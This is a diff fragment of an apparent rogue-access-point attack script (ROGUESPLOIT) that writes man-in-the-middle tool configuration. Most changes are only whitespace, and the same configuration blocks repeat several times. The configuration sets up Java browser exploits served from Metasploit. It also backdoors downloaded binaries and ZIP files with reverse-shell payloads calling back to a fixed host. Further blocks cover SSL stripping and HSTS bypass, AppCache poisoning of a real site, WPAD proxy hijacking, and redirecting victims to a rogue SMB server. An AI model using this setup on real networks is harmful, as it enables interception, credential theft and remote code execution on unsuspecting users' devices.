 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -3031,7 +3083,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -3090,9 +3142,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -3124,7 +3176,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -3148,7 +3200,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -3173,13 +3225,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -3189,7 +3241,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 192.168.0.4
@@ -3254,7 +3306,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
@@ -3312,6 +3364,7 @@ fi
 
 
 #main menu
+checktools
 welcome
 clear
 mitmf_install
@@ -3335,7 +3388,7 @@ if test $answer1 == '1'
 	pkill dhcpd
 	pkill dns*
 	echo -ne $red"[!]"$yellow" Input the name you want to use for the Access Point "$red"[!]\n";
-	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) "; 
+	echo -ne $red"["$yellow"$myname"$red"@"$yellow"fakeap"$red"]"$white": "$red"("$white" Ex. AndroidAP"$red" ) ";
 	read nameap
 	zenity --info --title="[*] ROGUESPLOIT [*]" --text="Starting the Fake Access Point";
 	sleep 1
@@ -3639,7 +3692,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'Google yssas'
 
@@ -3654,7 +3707,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -3720,7 +3773,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -3736,7 +3789,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -3745,7 +3798,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -3754,7 +3807,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -3798,13 +3851,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -3823,13 +3876,13 @@ EOF
 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -3837,7 +3890,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -3896,9 +3949,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -3930,7 +3983,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -3954,7 +4007,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -3979,13 +4032,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -3995,7 +4048,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 192.168.0.4
@@ -4060,7 +4113,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
@@ -4444,7 +4497,7 @@ EOF
 #
 
 [Replace]
-	
+
 	[[Regex1]]
 		'Google Search' = 'Google yssas'
 
@@ -4459,7 +4512,7 @@ EOF
 	#Client = '192.168.1.26'
 
 [SSLstrip+]
-	
+
 	#
 	#Here you can configure your domains to bypass HSTS on, the format is real.domain.com = fake.domain.com
 	#
@@ -4525,7 +4578,7 @@ EOF
 
 		#Custom WPAD Script
 		WPADScript = 'function FindProxyForURL(url, host){if ((host == "localhost") || shExpMatch(host, "localhost.*") ||(host == "127.0.0.1") || isPlainHostName(host)) return "DIRECT"; if (dnsDomainIs(host, "RespProxySrv")||shExpMatch(host, "(*.RespProxySrv|RespProxySrv)")) return "DIRECT"; return 'PROXY ISAProxySrv:3141; DIRECT';}'
-		
+
 		#HTML answer to inject in HTTP responses (before </body> tag).
 		#Set to an empty string to disable.
 		#In this example, we redirect make users' browsers issue a request to our rogue SMB server.
@@ -4541,7 +4594,7 @@ EOF
 	# HTML5 AppCache poisioning attack
 	# see http://blog.kotowicz.net/2010/12/squid-imposter-phishing-websites.html for description of the attack.
 	# generic settings for tampering engine
-	
+
 	#enable_only_in_useragents=Chrome|Firefox
 
 	templates_path=config/app_cache_poison_templates
@@ -4550,7 +4603,7 @@ EOF
 	#(to poison the cache for all of them all at once)
 
 	mass_poison_url_match=http://.*prezydent\.pl.*
-	
+
 	# it's only useful to mass poison chrome because:
 	# - it supports iframe sandbox preventing framebusting
 	# - does not ask for confirmation
@@ -4559,7 +4612,7 @@ EOF
 
 	[[test]]
 		# any //example.com URL redirects to iana and will display our spoofed content
-		
+
 		tamper_url=http://example.com/
 		manifest_url=http://www.iana.org/robots.txt #use existing static URL that is rarely seen by the browser user, but exists on the server (no 404!)
 		templates=test # which templates to use for spoofing content?
@@ -4603,13 +4656,13 @@ EOF
 	#
 	# When adding java exploits remember the following format: version string (eg 1.6.0) + update version (eg 28) = 1.6.0.28
 	#
-	
+
 	msfport = 8080    # Port to start Metasploit's webserver which will host the exploits
 
 	[[exploits]]
 
 		[[[multi/browser/java_rhino]]] #Exploit's MSF path
-			
+
 			Type = PluginVuln  #Can be set to PluginVuln, BrowserVuln
 			OS   = Any         #Can be set to Any, Windows or Windows + version (e.g Windows 8.1)
 
@@ -4628,13 +4681,13 @@ EOF
 			PluginVersions = 1.5.0, 1.5.0.1, 1.5.0.10, 1.5.0.11, 1.5.0.12, 1.5.0.13, 1.5.0.14, 1.5.0.15, 1.5.0.16, 1.5.0.17, 1.5.0.18, 1.5.0.19, 1.5.0.2, 1.5.0.20, 1.5.0.21, 1.5.0.22, 1.5.0.23, 1.5.0.24, 1.5.0.25, 1.5.0.26, 1.5.0.27, 1.5.0.28, 1.5.0.29, 1.5.0.3, 1.5.0.31, 1.5.0.33, 1.5.0.4, 1.5.0.5, 1.5.0.6, 1.5.0.7, 1.5.0.8, 1.5.0.9, 1.6.0, 1.6.0.1, 1.6.0.10, 1.6.0.11, 1.6.0.12, 1.6.0.13, 1.6.0.14, 1.6.0.15, 1.6.0.16, 1.6.0.17, 1.6.0.18, 1.6.0.19, 1.6.0.2, 1.6.0.20, 1.6.0.21, 1.6.0.22, 1.6.0.24, 1.6.0.25, 1.6.0.26, 1.6.0.27, 1.6.0.29, 1.6.0.3, 1.6.0.30, 1.6.0.4, 1.6.0.5, 1.6.0.6, 1.6.0.7, 1.7.0, 1.7.0.1, 1.7.0.2
 
 		[[[multi/browser/java_jre17_jmxbean_2]]]
-			
+
 			Type    = PluginVuln
 			OS      = Any
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_jre17_reflection_types]]]
 
 			Type    = PluginVuln
@@ -4642,7 +4695,7 @@ EOF
 			Browser = Any
 			Plugin  = Java
 			PluginVersions = 1.7.0, 1.7.0.1, 1.7.0.10, 1.7.0.11, 1.7.0.13, 1.7.0.15, 1.7.0.17, 1.7.0.2, 1.7.0.3, 1.7.0.4, 1.7.0.5, 1.7.0.6, 1.7.0.7, 1.7.0.9
-		
+
 		[[[multi/browser/java_verifier_field_access]]]
 
 			Type    = PluginVuln
@@ -4701,9 +4754,9 @@ EOF
 
 [FilePwn]
 
-	# 
+	#
 	#   Author Joshua Pitts the.midnite.runr 'at' gmail <d ot > com
-	#	
+	#
 	#	Copyright (c) 2013-2014, Joshua Pitts
 	#	All rights reserved.
 	#
@@ -4735,7 +4788,7 @@ EOF
 	#
 
 	[[hosts]]
-	#whitelist host/IP - patch these only. 
+	#whitelist host/IP - patch these only.
 	#ALL is everything, use the blacklist to leave certain hosts/IPs out
 
 	whitelist = ALL
@@ -4759,7 +4812,7 @@ EOF
 
 	[[ZIP]]
 	# patchCount is the max number of files to patch in a zip file
-	# After the max is reached it will bypass the rest of the files 
+	# After the max is reached it will bypass the rest of the files
 	# and send on it's way
 
 	patchCount = 5
@@ -4784,13 +4837,13 @@ EOF
 	[[targets]]
 		#MAKE SURE that your settings for host and port DO NOT
 		# overlap between different types of payloads
-		
+
 		[[[ALL]]] # DEFAULT settings for all targets REQUIRED
-		
+
 		LinuxType = ALL 	# choices: x86/x64/ALL/None
 		WindowsType = ALL 	# choices: x86/x64/ALL/None
 		FatPriority = x86   # choices: x86 or x64
-		
+
 		FileSizeMax = 10000000  # ~10 MB (just under) No patching of files this large
 
 		CompressedFiles = True #True/False
@@ -4800,7 +4853,7 @@ EOF
 			PORT = 8888
 			SUPPLIED_SHELLCODE = None
 			MSFPAYLOAD = linux/x86/shell_reverse_tcp	# MSF syntax
-			
+
 			[[[[LinuxIntelx64]]]]
 			SHELL = reverse_shell_tcp
 			HOST = 192.168.0.4
@@ -4865,7 +4918,7 @@ EOF
 
 		# Call out the difference for targets here as they differ from ALL
 		# These settings override the ALL settings
-		
+
 		[[[sysinternals.com]]]
 		LinuxType = None
 		WindowsType = ALL
